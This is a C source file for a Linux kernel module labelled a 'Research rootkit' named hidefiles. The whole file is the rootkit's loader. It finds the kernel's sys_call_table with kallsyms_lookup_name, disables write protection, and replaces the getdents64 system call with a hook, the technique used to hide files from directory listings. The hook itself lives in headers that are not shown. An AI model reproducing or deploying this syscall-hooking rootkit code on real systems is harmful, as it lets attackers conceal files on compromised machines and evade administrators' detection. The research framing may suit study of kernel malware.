#include <linux/module.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/miscdevice.h>

#include "syscall_hooks.h"
#include "mem_protection.h"

MODULE_AUTHOR("Erez");
MODULE_DESCRIPTION("Research rootkit");
MODULE_LICENSE("GPL");

void **sys_call_table = NULL;

typedef enum
{
	CODE_SUCCESS = 0,
	CODE_KALLSYMS_FAILED = 1,
} ERROR_CODE_E;

static int __init hidefiles_init()
{
	sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
	if (sys_call_table == 0)
	{
		printk(KERN_ERR "Could not lookup 'sys_call_table'\n");
		return CODE_KALLSYMS_FAILED;
	}

	printk(KERN_INFO "The address of sys_call_table is: %p\n", sys_call_table);

	disable_write_protection();
	original_getdents = sys_call_table[__NR_getdents64];
	sys_call_table[__NR_getdents64] = sys_getdents_hook;
	enable_write_protection();

	printk(KERN_INFO "Successfuly loaded hidefiles\n");
	return 0;
}

static void __exit hidefiles_exit()
{
	disable_write_protection();
	sys_call_table[__NR_getdents64] = original_getdents;
	enable_write_protection();

	printk(KERN_INFO "Successfuly unloaded hidefiles\n");
	return;
}

module_init(hidefiles_init);
module_exit(hidefiles_exit);
